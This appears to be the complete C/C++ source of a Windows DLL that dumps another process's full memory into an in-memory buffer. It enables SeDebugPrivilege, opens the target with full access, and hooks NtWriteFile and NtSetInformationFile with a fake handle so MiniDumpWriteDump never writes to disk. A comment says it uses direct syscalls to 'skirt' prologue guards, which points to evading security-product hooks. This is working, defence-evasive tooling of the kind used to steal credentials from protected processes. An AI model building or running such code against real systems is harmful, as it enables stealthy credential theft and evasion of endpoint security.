

#include <stdbool.h>

#include <handleapi.h>
#include <rpc.h>
#include <dbghelp.h>
#include <winternl.h>

#include "Utils.h"
#include "DataPool.h"
#include "NtDirect.h"

#define EXPORT __declspec(dllexport)

#define STATUS_SUCCESS 0
typedef NTSTATUS(NTAPI *pNtWriteFile)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
typedef NTSTATUS(NTAPI *pNtSetInformationFile)(HANDLE FileHandle,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass);
typedef NTSTATUS(NTAPI *pNtReadVirtualMemory)(HANDLE ProcessHandle,PVOID BaseAddress,PVOID Buffer,ULONG NumberOfBytesToRead,PULONG NumberOfBytesReaded);

#define JENNY (HANDLE)8675309
NtRedirect* r_NtReadVirtualMemory = nullptr;
NtRedirect* r_NtWriteFile = nullptr;
NtRedirect* r_NtSetInformationFile = nullptr;
static DataPool* buffered_dump;

pNtWriteFile real_NtWriteFile = nullptr;
pNtSetInformationFile real_NtSetInformationFile = nullptr;

// We will use a naked version of this to skirt any prologue guards that may be active.
pNtReadVirtualMemory real_NtReadVirtualMemory = iNtReadVirtualMemory;



// Our fake file requires a STATUS_SUCCESS in the IoStatusBlock to not flip out.
// In reality, this function is called to update the file handle offset pointer which we also don't care about.
static NTSTATUS NTAPI HK_NtSetInformationFile(HANDLE FileHandle,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass){
    if(FileHandle == JENNY){
        IoStatusBlock->Status = STATUS_SUCCESS;
        return 0;
    }
    return real_NtSetInformationFile(FileHandle,IoStatusBlock,FileInformation,Length,FileInformationClass);
}

// When we get a write call to our fake handle, dump it into our dynamically expanding buffer.
static NTSTATUS NTAPI HK_NtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key){
    if(FileHandle == JENNY){
        IoStatusBlock->Information = Length;
        IoStatusBlock->Status = 0;
        buffered_dump->cat((uint8_t*)Buffer,Length);
        return 0;
    }
    return real_NtWriteFile(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,Buffer,Length,ByteOffset,Key);
}

bool set_sedebug(bool bEnabledState){
    TOKEN_PRIVILEGES priv = { 0,0,0,0 };
    HANDLE hToken = nullptr;
    LUID luid = { 0,0 };
    if (iNtOpenProcessToken(CURRENT_PROCESS_HANDLE, TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        if (hToken)
            CloseHandle(hToken);
        return false;
    }
    if (!LookupPrivilegeValueA(nullptr, "SeDebugPrivilege", &luid)) {
        if (hToken)
            CloseHandle(hToken);
        return false;
    }
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = bEnabledState ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
    if (iNtAdjustPrivilegesToken(hToken, false, &priv, 0,0, 0)) {
        if (hToken)
            CloseHandle(hToken);
        return false;
    }
    if (hToken)
        CloseHandle(hToken);
    return true;
}

bool enable_sedebug(){return set_sedebug(true);}
bool disable_sedebug(){return set_sedebug(false);}


// Make environment modifications to do what we need to do in order to dump our process.
bool install_patch(){

    r_NtReadVirtualMemory = new NtRedirect("NtReadVirtualMemory",(void*)real_NtReadVirtualMemory,(void**)&real_NtReadVirtualMemory);
    if(!r_NtReadVirtualMemory->valid){
        Utils_printfDBG("Hook NtReadVirtualMemory Failed!");
        return false;
    }

    r_NtSetInformationFile = new NtRedirect("NtSetInformationFile", (void*)&HK_NtSetInformationFile, (void**)&real_NtSetInformationFile);
    if(!r_NtSetInformationFile->valid){
        Utils_printfDBG("Hook NtSetInformationFile Failed!");
        return false;
    }

    r_NtWriteFile = new NtRedirect("NtWriteFile",(void*)&HK_NtWriteFile, (void**)&real_NtWriteFile);
    if(!r_NtWriteFile->valid){
        Utils_printfDBG("Hook NtWriteFile Failed!");
        return false;
    }
    if(!enable_sedebug()){
        Utils_printfDBG("enable_sedebug Fail!");
        return false;
    }
    return true;
}

// Do everything we need to do in order to undo everything we did.
bool remove_patch(){
    disable_sedebug();
    delete r_NtReadVirtualMemory;
    delete r_NtWriteFile;
    delete r_NtSetInformationFile;
    return true;
}

extern "C"
{
EXPORT bool dump_process_memory(uint32_t process_id, unsigned char **dmp_ptr, size_t *dmp_length) {

    if (!install_patch()) {
        Utils_printfDBG("Install Patch Failed!");
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
    if (!hProcess) {
        Utils_printfDBG("OpenProcess Failed!\n");
        return false;
    }

    buffered_dump = new DataPool();

    if (!MiniDumpWriteDump(hProcess, process_id, JENNY, MiniDumpWithFullMemory, nullptr, nullptr, nullptr)) { return false; }

    if (!remove_patch()) { return false; }

    *dmp_ptr = buffered_dump->data;
    *dmp_length = buffered_dump->length;
    return true;
}
}

// Library Entry-Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved){return TRUE;}
